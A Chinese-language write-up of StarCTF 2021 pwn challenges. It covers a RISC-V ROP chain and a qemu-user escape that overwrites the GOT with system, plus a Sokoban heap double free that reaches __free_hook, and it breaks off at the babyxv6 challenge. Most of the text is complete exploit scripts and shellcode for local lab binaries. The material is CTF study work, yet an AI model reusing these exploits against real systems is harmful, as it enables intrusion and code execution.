
在ghidra中查找包含`c.ldsp`指令的gadget以控制寄存器，只能直接找到控制saved regs的片段

```assembly
                             LAB_0001179e                                       
        0001179e e2  70           c.ldsp     ra,0x38 (sp)   # 栈上内容送reg
        000117a0 42  74           c.ldsp     s0,0x30 (sp)
        000117a2 a2  74           c.ldsp     s1,0x28 (sp)
        000117a4 02  79           c.ldsp     s2,0x20 (sp)
        000117a6 e2  69           c.ldsp     s3,0x18 (sp)
        000117a8 42  6a           c.ldsp     s4,0x10 (sp)
        000117aa a2  6a           c.ldsp     s5,0x8 (sp)
        000117ac 21  61           c.addi16   sp,0x40		# sp += 0x40 
        000117ae 82  80           ret						# jalr ra

```

但我们知道一定会有把saved regs送往常用寄存器的gadget，实际上就在上面就有一条完整的利用链。由于没有got表，所以通过控制a5并利用0x0011796的跳转来实现任意地址执行。注意与x86不同的是，ret指令并不会改变sp位置。

```assembly
        00011772 93  07  84  b8    addi       a5,s0,-0x478	# a5 = s0 - 0x478
        00011776 13  09  09  b9    addi       s2,s2,-0x470
        0001177a 33  09  f9  40    sub        s2,s2,a5		# s2 -= 0x470 + a5
        0001177e 13  59  39  40    srai       s2,s2,0x3		# s2 >>= 3
        00011782 63  0e  09  00    beq        s2,zero ,LAB_0001179e # s2=0则跳转

                                     LAB_0001178c                                      
        0001178c 1c  60           c.ld       a5=>->FUN_00010284 ,0x0 (s0=>->FUN_00010250 )      
        0001178e 56  86           c.mv       a2,s5	# s5 -> a2
        00011790 d2  85           c.mv       a1,s4	# s4 -> a1
        00011792 4e  85           c.mv       a0,s3	# s3 -> a0
        00011794 85  04           c.addi     s1,0x1
        00011796 82  97           c.jalr     a5=>FUN_00010284	# 无条件跳转，并且把下一条指令写进ra（跳回继续执行）
        00011798 21  04           c.addi     s0,0x8
        0001179a e3  19  99  fe    bne        s2,s1,LAB_0001178c # s1≠s2则跳转
```

整体思路为

1. 跳到0x1179e控制s0-s5与ra
2. ret到0x11772，使a5=target_fn, s2=0
3. 跳转到0x1179e再次控制s0-s5与ra
4. ret到0x1178e控制a0-a2，执行target_fn，使s1=s2，让其继续执行到0x1179e
5. 控制ra并重新回到main函数

```python
def ROP_ctrl(target_fn, para1, para2, para3):
    payload = 'a'*0x120
    payload += flat(0x1179e, 
                    0,
                    0, 0, # s5, s4
                    0, target_fn+0x470, # s3, s2
                    0, target_fn+0x478, # s1, s0
                    0x11772, # ra
                    0,
                    para3, para2, # s5, s4
                    para1, 1,  # s3, s2
                    0, 0, # s1, s0
                    0x1178e, # ra
                    0, 0, 0, 0, 0, 0, 0, # s0-s5
                    main_addr, # ra
                   ) 
    
    return payload
```

至此我们便可以随心所欲地ROP了，最后需要找到orw的系统调用，RISC-V64用a7保存调用号。

openat：FUN_000221cc

```assembly
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_000221cc () 
        000221cc 37  de  06  00    lui        t3,0x6d
        000221d0 83  3e  0e  ba    ld         t4,-0x460 (t3=>DAT_0006cba0 )
        000221d4 5d  71           c.addi16   sp,-0x50
        000221d6 3e  fc           c.sdsp     a5,0x38 (sp)
        000221d8 06  ec           c.sdsp     ra,0x18 (sp)
        000221da 93  f7  05  04    andi       a5,a1,0x40
        000221de 32  f0           c.sdsp     a2,0x20 (sp)
        000221e0 36  f4           c.sdsp     a3,0x28 (sp)
        000221e2 3a  f8           c.sdsp     a4,0x30 (sp)
        000221e4 c2  e0           c.sdsp     a6,0x40 (sp)
        000221e6 c6  e4           c.sdsp     a7,0x48 (sp)
        000221e8 76  e4           c.sdsp     t4,0x8 (sp)
        000221ea 2e  83           c.mv       t1,a1
        000221ec aa  85           c.mv       a1,a0
        000221ee 8d  ef           c.bnez     a5,LAB_00022228
        000221f0 b7  07  41  00    lui        a5,0x410
        000221f4 b3  77  f3  00    and        a5,t1,a5
        000221f8 37  07  41  00    lui        a4,0x410
        000221fc 81  46           c.li       a3,0x0
        000221fe 63  85  e7  02    beq        a5,a4,LAB_00022228
        00022202 93  08  80  03    li         a7,0x38		# 调用号0x38为openat
        00022206 13  05  c0  f9    li         a0,-0x64
        0002220a 1a  86           c.mv       a2,t1
        0002220c 73  00  00  00    ecall					# syscall

```

read：

```assembly
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_000222ce ()    
        000222ce 93  08  f0  03    li         a7,0x3f
        000222d2 73  00  00  00    ecall

```

exp如下

```python
from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')

def ROP_ctrl(target_fn, para1, para2, para3):
    payload = 'a'*0x120
    payload += flat(0x1179e, 
                    0,
                    0, 0, # s5, s4
                    0, target_fn+0x470, # s3, s2
                    0, target_fn+0x478, # s1, s0
                    0x11772, # ra
                    0,
                    para3, para2, # s5, s4
                    para1, 1,  # s3, s2
                    0, 0, # s1, s0
                    0x1178e, # ra
                    0, 0, 0, 0, 0, 0, 0, # s0-s5
                    main_addr, # ra
                   ) 
    
    return payload

main_addr=0x10400
read_addr=0x222ce
open_addr=0x221cc
printf_addr=0x1605a
file_name=0x6c120
flag_addr=0x6c110
sh = process(["./qemu-riscv64" , "./main"], aslr=False)
payload=ROP_ctrl(read_addr,0,file_name,15)
sh.sendlineafter('flag:',payload)
sh.send('/flag.txt\x00')

payload=ROP_ctrl(open_addr,file_name,0,0)
sh.sendlineafter('flag:',payload)

payload=ROP_ctrl(read_addr,3,flag_addr,0x40)
sh.sendlineafter('flag:',payload)

payload=ROP_ctrl(printf_addr,flag_addr,0,0)
sh.sendlineafter('flag:',payload)

sh.interactive()
```

成功读取本地flag文件，ubuntu2004复现成功

```bash
(pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ python ./exp.py 
[+] Starting local process './qemu-riscv64': pid 9209
[*] Switching to interactive mode
 You are wrong ._.
flag{test}
Input the flag: $ 
[*] Interrupted
[*] Stopped process './qemu-riscv64' (pid 9209)
```

各大战队做法：

- 六星 https://github.com/sixstars/starctf2021/blob/main/re%26pwn-favourite%20architecture/src/solve.py 得调具体环境下的栈地址等，复现有点麻烦；纯shellcode也有点难写...
- 天璇 https://www.anquanke.com/post/id/229322#h3-13 主要参考此篇复现，纯用gadget，技巧性较高，但容易复现，不受环境影响。
- 星盟 https://wemp.app/posts/c41f7523-05e1-4854-9b69-5030ede025a1 gadget+orw shellcode

## favourite arch 2

这题要求执行`/readflag2`，我们必须更进一步拿到shell。

漏洞同样是用户态程序的栈溢出，远程环境中的qemu被patch过，限制了其模拟程序时执行一些syscall，即在riscv层面上无法getshell。所以这题要直接日穿qemu，rce而不只是orw

我们需要进一步理解qemu-user，它将模拟的程序加载到自己进程的内存里，然后读取其中的数据模拟执行。但qemu-user实际上却允许模拟程序的代码访问qemu本体进程的内存（32位由于高地址太高访问不到，但64位却可以），这便是突破口。

来详细看看内存布局，有以下几点值得注意

* qemu本体被加载到内存中的地址就是0x555555554000 （aslr=False）
* 被模拟的程序在很低的地址处
* libc仍然在高地址处
* 0x4000001000是固定的，是qemu给risc-v分配的栈空间

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
           0x10000            0x6c000 r--p    5c000 0      /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/main
           0x6c000            0x6f000 rw-p     3000 5b000  /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/main
           0x6f000            0x93000 rw-p    24000 0
      0x4000000000       0x4000001000 ---p     1000 0
      0x4000001000       0x4000801000 rw-p   800000 0
    0x561c72350000     0x561c727b9000 r-xp   469000 0      /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/qemu-riscv64
    0x561c729b8000     0x561c729f4000 r--p    3c000 468000 /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/qemu-riscv64
    0x561c729f4000     0x561c72a20000 rw-p    2c000 4a4000 /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/qemu-riscv64
    0x561c72a20000     0x561c72a3d000 rw-p    1d000 0
    0x561c7396a000     0x561c73a13000 rw-p    a9000 0      [heap]
    0x7fa304000000     0x7fa30bfff000 rwxp  7fff000 0
    0x7fa30bfff000     0x7fa30c000000 ---p     1000 0
    0x7fa30c000000     0x7fa30c021000 rw-p    21000 0
    0x7fa30c021000     0x7fa310000000 ---p  3fdf000 0
    0x7fa3114ee000     0x7fa31156f000 rw-p    81000 0
    0x7fa31156f000     0x7fa311570000 ---p     1000 0
    0x7fa311570000     0x7fa311d75000 rw-p   805000 0
    0x7fa311d75000     0x7fa311d76000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d76000     0x7fa311d78000 r-xp     2000 1000   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d78000     0x7fa311d79000 r--p     1000 3000   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d79000     0x7fa311d7a000 r--p     1000 3000   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d7a000     0x7fa311d7b000 rw-p     1000 4000   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d7b000     0x7fa311d7d000 r--p     2000 0      /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d7d000     0x7fa311d83000 r-xp     6000 2000   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d83000     0x7fa311d84000 r--p     1000 8000   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d84000     0x7fa311d85000 ---p     1000 9000   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d84000     0x7fa311d85000 ---p     1000 9000   /usr/lib/x86_64-linux-gnu/[144/367]
.7.1.0
    0x7fa311d85000     0x7fa311d86000 r--p     1000 9000   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d86000     0x7fa311d87000 rw-p     1000 a000   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d87000     0x7fa311d89000 r--p     2000 0      /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311d89000     0x7fa311dda000 r-xp    51000 2000   /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311dda000     0x7fa311df8000 r--p    1e000 53000  /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311df8000     0x7fa311df9000 r--p     1000 70000  /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311df9000     0x7fa311dfa000 rw-p     1000 71000  /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311dfa000     0x7fa311e04000 r--p     a000 0      /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e04000     0x7fa311e64000 r-xp    60000 a000   /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e64000     0x7fa311e7b000 r--p    17000 6a000  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7b000     0x7fa311e7c000 ---p     1000 81000  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7c000     0x7fa311e7d000 r--p     1000 81000  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7d000     0x7fa311e7e000 rw-p     1000 82000  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7e000     0x7fa311e85000 r--p     7000 0      /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311e85000     0x7fa311e96000 r-xp    11000 7000   /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311e96000     0x7fa311eb4000 r--p    1e000 18000  /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311eb4000     0x7fa311eb5000 r--p     1000 35000  /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311eb5000     0x7fa311eb6000 rw-p     1000 36000  /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311eb6000     0x7fa311eb8000 rw-p     2000 0
    0x7fa311eb8000     0x7fa311ec1000 r--p     9000 0      /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311ec1000     0x7fa311edf000 r-xp    1e000 9000   /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311edf000     0x7fa311eef000 r--p    10000 27000  /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311eef000     0x7fa311ef1000 r--p     2000 36000  /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311ef1000     0x7fa311ef2000 rw-p     1000 38000  /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311ef2000     0x7fa311ef5000 r--p     3000 0      /usr/lib/x86_64-linux-gnu/libtasn1e
    .so.7.0                                                                             
    0x7fa311ef2000     0x7fa311ef5000 r--p     3000 0      /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311ef5000     0x7fa311f01000 r-xp     c000 3000   /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f01000     0x7fa311f05000 r--p     4000 f000   /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f05000     0x7fa311f06000 ---p     1000 13000  /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f06000     0x7fa311f07000 r--p     1000 13000  /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f07000     0x7fa311f08000 rw-p     1000 14000  /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f08000     0x7fa311f18000 r--p    10000 0      /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa311f18000     0x7fa311f4e000 r-xp    36000 10000  /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa311f4e000     0x7fa312085000 r--p   137000 46000  /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa312085000     0x7fa312086000 ---p     1000 17d000 /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa312086000     0x7fa312089000 r--p     3000 17d000 /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa312089000     0x7fa31208a000 rw-p     1000 180000 /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa31208a000     0x7fa31208c000 r--p     2000 0      /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa31208c000     0x7fa312091000 r-xp     5000 2000   /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa312091000     0x7fa3120a8000 r--p    17000 7000   /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120a8000     0x7fa3120a9000 ---p     1000 1e000  /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120a9000     0x7fa3120aa000 r--p     1000 1e000  /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120aa000     0x7fa3120ab000 rw-p     1000 1f000  /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120ab000     0x7fa3120d6000 r--p    2b000 0      /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3120d6000     0x7fa312170000 r-xp    9a000 2b000  /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa312170000     0x7fa3121cc000 r--p    5c000 c5000  /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3121cc000     0x7fa3121d7000 r--p     b000 120000 /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3121d7000     0x7fa3121e1000 rw-p     a000 12b000 /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3121e1000     0x7fa312206000 r--p    25000 0      /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa312206000     0x7fa31237e000 r-xp   178000 25000  /usr/lib/x86_64-linux-gnu/libc-2.31
    .so                                                                                   
    0x7fa312206000     0x7fa31237e000 r-xp   178000 25000  /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa31237e000     0x7fa3123c8000 r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123c8000     0x7fa3123c9000 ---p     1000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123c9000     0x7fa3123cc000 r--p     3000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123cc000     0x7fa3123cf000 rw-p     3000 1ea000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123cf000     0x7fa3123d5000 rw-p     6000 0
    0x7fa3123d5000     0x7fa3123dc000 r--p     7000 0      /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123dc000     0x7fa3123ed000 r-xp    11000 7000   /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123ed000     0x7fa3123f2000 r--p     5000 18000  /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123f2000     0x7fa3123f3000 r--p     1000 1c000  /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123f3000     0x7fa3123f4000 rw-p     1000 1d000  /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123f4000     0x7fa3123f8000 rw-p     4000 0
    0x7fa3123f8000     0x7fa3123fb000 r--p     3000 0      /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa3123fb000     0x7fa31240d000 r-xp    12000 3000   /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa31240d000     0x7fa312411000 r--p     4000 15000  /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa312411000     0x7fa312412000 r--p     1000 18000  /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa312412000     0x7fa312413000 rw-p     1000 19000  /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa312413000     0x7fa312422000 r--p     f000 0      /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312422000     0x7fa3124c9000 r-xp    a7000 f000   /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa3124c9000     0x7fa312560000 r--p    97000 b6000  /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312560000     0x7fa312561000 r--p     1000 14c000 /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312561000     0x7fa312562000 rw-p     1000 14d000 /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312562000     0x7fa31257e000 r--p    1c000 0      /usr/lib/x86_64-linux-gnu/libglib-2
.0.so.0.6400.3
    0x7fa31257e000     0x7fa312602000 r-xp    84000 1c000  /usr/lib/x86_64-linux-gnu/libglib-2
.0.so.0.6400.3
    0x7fa312602000     0x7fa312687000 r--p    85000 a0000  /usr/lib/x86_64-linux-gnu/libglib-2
.0.so.0.6400.3
    0x7fa312687000     0x7fa312688000 ---p     1000 125000 /usr/lib/x86_64-linux-gnu/libglib-$
```

对内存布局有个大体的了解之后，我们需要泄露libc_base与qemu_base

用arch1的脚本读出/proc/self/maps，发现这还是qemu模拟的内存

```bash
(pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ python ./exp2.py 
[+] Starting local process './qemu-riscv64': pid 14856
[!] ASLR is disabled!
[*] Switching to interactive mode
 You are wrong ._.
10000-6c000 r--p 00000000 00:38 19                                       /mnt/hgfs/linux_share/starctf/favourite_architecture/share/main
6c000-6f000 rw-p 0005b000 00:38 19                                       /mnt/hgfs/linux_share/starctf/favourite_architecture/share/main
6f000-93000 rw-p 00000000 00:00 0                                        
4000000000-4000001000 ---p 00000000 00:00 0                              
4000001000-4000801000 rw-p 00000000 00:00 0                              [stack]
Input the flag: $ 
```

读穿qemu模拟内存有三种方法

方法一：读的是/proc/self/syscall （By 0ops）

方法二：读/./proc/self/maps （By redbud）这种方法能直接读到整个真的vmmap（貌似qemu本身一直有这个洞...）

​			（没记错的话pwntools每次最多只能收0x1000个字符，顺着多读几次就能拿到完整的内存布局）

方法三：mmap一段已经存在的地址，把它挤到高地址处。（By sixstar）

​			根据mmap特性，如果要映射的内存已经在使用了，它会从与libc偏移固定的高地址处分配（0x7f...），进而得到libc_base

我们现在可以直接打qemu本体来getshell. 直接把qemu当做一般的elf来打，拿到本体的mprotect

```python
In [1]: from pwn import *

In [2]: elf = ELF("./qemu-riscv64")
[*] '/mnt/hgfs/linux_share/starctf/favourite_architecture/share/qemu-riscv64'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

In [3]: elf.got['mprotect']
Out[3]: 6959616

In [4]: hex(elf.got['mprotect'])
Out[4]: '0x6a3200'

In [5]: 
```

利用方法一 (×)：利用risc-v本身的函数，不断ROP，比如0x1605a->printf_addr

我们可以测试一下，打印出qemu的puts@got与根据libc_base计算出的puts_addr对比

```python
payload = ROP_ctrl(printf_addr, puts_got, 0, 0) # printf(puts@got)
io.sendlineafter('flag:',payload)

io.recvuntil("You are wrong ._.\n")
puts_addr = u64(io.recv(6)+"\x00\x00")
success("puts_addr : @" + hex(puts_addr))
success("puts_addr : @" + hex(libc_base+libc.sym['puts']))
```

确实是一致的

```bash
[+] puts_addr : @0x155554f075a0
[+] puts_addr : @0x155554f075a0
[*] Switching to interactive mode
Input the flag: $ 
[*] Interrupted
[*] Stopped process './qemu-riscv64' (pid 15449)
```

但也发现got表是不可写的，我们让这个0x3c00大小的段全部rwx

```bash
555555bbc000-555555bf8000 r--p 00468000 00:38 18 
/mnt/hgfs/linux_share/starctf/favourite_architecture/share/qemu-riscv64
```

但是用risc-v自己的一些函数比如mprotect(0x0022ab0)只能操作属于risc-v的较低地址，暂时不明白原因...遂放弃

利用方法二 (√)：写shellcode，先让qumu的got表可写，然后改qemu的mprotect@got为system来getshell

```python
shellcode = '''
int main() {
    long long * libc_base,* qemu_base;

    syscall(63,0,&qemu_base,8);
    syscall(63,0,&libc_base,8);

    long long * libc_system   =   libc_base + 349200/8;
    long long * mprotect_got  =   qemu_base + 0x6a3200/8;
    long long * ro_memory     =   qemu_base + 0x668000/8;

    syscall(226,ro_memory,0x3c000,6);
    * mprotect_got = (long long)  libc_system;
    * ro_memory    = (long long)  0x6873;

    syscall(226,ro_memory,0x3c000,6);

}

asm(
    "syscall:\\n"
    "mv a7, a0\\n"
    "mv a0, a1\\n"
    "mv a1, a2\\n"
    "mv a2, a3\\n"
    "ecall\\n"
    "ret\\n"
);
'''
```

其中shellcode的编译选项如下

```python
def gen_shellcode(shellcode):
    f = open("shellcode.c","w");f.write(shellcode);f.close()
    os.system("riscv64-linux-gnu-gcc -e main -nostdlib  -Os -static shellcode.c -o shellcode")
    os.system("riscv64-linux-gnu-objcopy --dump-section .text=sc.bin shellcode")
    f = open("sc.bin","rb");sc = f.read();f.close()
    print(sc)
    return sc
```

利用方法三 (√)：改malloc_hook为one_gadget，用writev来触发

完整exp如下，ubuntu2004复现成功

```python
from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')

def ROP_ctrl(target_fn, para1, para2, para3):
    payload = 'a'*0x120
    payload += flat(0x1179e, 
                    0,
                    0, 0, # s5, s4
                    0, target_fn+0x470, # s3, s2
                    0, target_fn+0x478, # s1, s0
                    0x11772, # ra
                    0,
                    para3, para2, # s5, s4
                    para1, 1,  # s3, s2
                    0, 0, # s1, s0
                    0x1178e, # ra
                    0, 0, 0, 0, 0, 0, 0, # s0-s5
                    main_addr, # ra
                   ) 
    
    return payload

main_addr=0x10400
read_addr=0x222ce
open_addr=0x221cc
printf_addr=0x1605a
file_name=0x6c120
flag_addr=0x6c110
io = process(["./qemu-riscv64","./main"])
payload=ROP_ctrl(read_addr,0,file_name,0x20)
io.sendlineafter('flag:',payload)
io.send("/./proc/self/maps\x00")

payload=ROP_ctrl(open_addr,file_name,0,0)  # openat
io.sendlineafter('flag:',payload)

payload=ROP_ctrl(read_addr,3,flag_addr,0xf00) # read
io.sendlineafter('flag:',payload)

payload=ROP_ctrl(printf_addr,flag_addr,0,0) # print
io.sendlineafter('flag:',payload)

data = io.recvuntil('qemu-riscv64')
data = data.split('\n')
for info in data:
    if 'qemu-riscv64' in info:
        qemu_base = int(info[:12], 16)
        success("qemu_base : @" + hex(qemu_base))

payload=ROP_ctrl(read_addr,3,flag_addr,0xf00) # read
io.sendlineafter('flag:',payload)

payload=ROP_ctrl(read_addr,3,flag_addr,0xf00) # read
io.sendlineafter('flag:',payload)

payload=ROP_ctrl(printf_addr,flag_addr,0,0) # print
io.sendlineafter('flag:',payload)

data = io.recvuntil('libc')
data = data.split('\n')
for info in data:
    if 'libc' in info:
        libc_base = int(info[:12], 16)
        success("libc_base : @" + hex(libc_base))

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
elf = ELF('./qemu-riscv64')
sys_addr = libc.sym['system'] + libc_base
mprotect_got = elf.got['mprotect'] + qemu_base
puts_got = qemu_base + elf.got['puts']
malloc_hook = libc_base + libc.sym['__malloc_hook']
success("malloc_hook : @" + hex(malloc_hook))
mprotect_addr = 0x0022ab0

# shellcode 
def gen_shellcode(shellcode):
    f = open("shellcode.c","w");f.write(shellcode);f.close()
    os.system("riscv64-linux-gnu-gcc -e main -nostdlib  -Os -static shellcode.c -o shellcode")
    os.system("riscv64-linux-gnu-objcopy --dump-section .text=sc.bin shellcode")
    f = open("sc.bin","rb");sc = f.read();f.close()
    print(sc)
    return sc

raw_input()

shellcode = '''
int main() {
    long long * libc_base,* qemu_base;

    syscall(63,0,&qemu_base,8);
    syscall(63,0,&libc_base,8);

    long long * libc_system   =   libc_base + 349200/8;
    long long * mprotect_got  =   qemu_base + 0x6a3200/8;
    long long * ro_memory     =   qemu_base + 0x668000/8;

    syscall(226,ro_memory,0x3c000,6);
    * mprotect_got = (long long)  libc_system;
    * ro_memory    = (long long)  0x6873;

    syscall(226,ro_memory,0x3c000,6);

}

asm(
    "syscall:\\n"
    "mv a7, a0\\n"
    "mv a0, a1\\n"
    "mv a1, a2\\n"
    "mv a2, a3\\n"
    "ecall\\n"
    "ret\\n"
);
'''


virtual_stack = 0x40008006b0 - 0x118
shellcode = gen_shellcode(shellcode)
io.sendlineafter('flag:',shellcode.ljust(0x120,'x') + p64(virtual_stack))
io.send(p64(qemu_base)+p64(libc_base))

io.interactive()
```

## babygame

是一个推箱子游戏，每次只能移动一下

```
(pwn) pwn@ubuntu:~/share/starctf/pwn_babygame$ ./pwn
Please input an level from 1-9:
1
Map:
   ███  
   █○█  
████□█  
█○ □♀███
███□ □○█
  █ ████
  █○█   
  ███   

Please input an order:
123
Wrong input, type 'h' for help
Please input an order:
h
     Sokoban    
How to Play:
    Push all boxs into target place
Map:
    1)█:wall
    2)○:Target
    3)□:Box
    4)♀:Player
    5)●:Box on target
Command:
    1)h: show this message
    2)q: quit the game
    3)w: move up
    4)s: move down
    5)a: move left
    6)d: move right
    7)b: move back
    8)m: leave message
    k)n: show name
    10)l: show message

Please input an order:
```

玩着玩着就崩了...出题人复盘的时候说这题该给源码的，C++我实在是逆不明白...

我们走完一关以后选择level2，q退出以后会触发double free(ubuntu2004)。给的libc是2.27，跑到ubuntu1804继续玩下去，l意外地泄露了libc地址，猜测有什么东西被free后进入unsorted bin

官方wp有点问题...改了一下 ubuntu18.04能打通

```python
from pwn import *
import time

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
io = process("./pwn")

io.sendlineafter("Please input an level from 1-9:\n", '1')
step = "wsaadsswdd"
for i in step:
  io.sendlineafter("Please input an order:\n", i)

io.sendlineafter("Please input an level from 1-9:\n", '2')
io.sendlineafter("Please input an order:\n", 'q')
io.sendlineafter("leave your name?\n", 'n')
io.sendlineafter("restart?\n", 'y')
io.sendlineafter("Please input an level from 1-9:\n", 'l')
io.recvuntil("message:")
libc_base = u64(io.recv(6) + '\x00\x00') - 0x3ebca0
success("libc_base : @"+hex(libc_base))

def edit(info):
  io.sendlineafter("Please input an level from 1-9:\n", 'q')
  io.sendlineafter("leave your name?\n", 'y')
  io.sendlineafter("your name:", info)
  io.sendlineafter("restart?", 'y')

libc = ELF("./pwn").libc
freehook = libc.sym['__free_hook'] + libc_base
success("freehook : @"+hex(freehook))
payload = p64(freehook) 
payload = payload.ljust(0x50,'a')
edit(payload)
edit(payload) 
system = libc.sym["system"] + libc_base
success("system : @"+hex(system))
payload = p64(system)
payload = payload.ljust(0x50,'a') 
edit(payload)
edit(payload)
io.sendlineafter("Please input an level from 1-9",'1') 
io.sendafter("Please input an order:",'m\n')
io.sendafter("message:",'/bin/sh\x00\n')
io.sendafter("Please input an order:",'q\n') 
io.sendafter("leave your name?",'n\n')  

io.interactive()
```

## babyxv6

* share：编译好的
  * fs.img：文件系统镜像
  * kernel：内核
  * run.sh：启动脚本
* src：源码

找到user的源码，程序执行逻辑如下

```c
void challenge()
{
    int size;
    char input[0x80];

    printf("Welcome to babystack 2021!\n");
    printf("How many bytes do you want to send?\n");
    
    size = readnum();
    if (size > 0x1000) {
        printf("You are greedy!\n");
        return;
    }

    printf("show me your input\n");
    read(0, input, 0x80);
    baby(input, size);

    printf("It's time to say goodbye.\n");
    return;
}
```

sysproc.中增加了sys_baby系统调用

```c
uint64
sys_baby(void)
{
    int n;
    uint64 p;
    char pad[0x100];

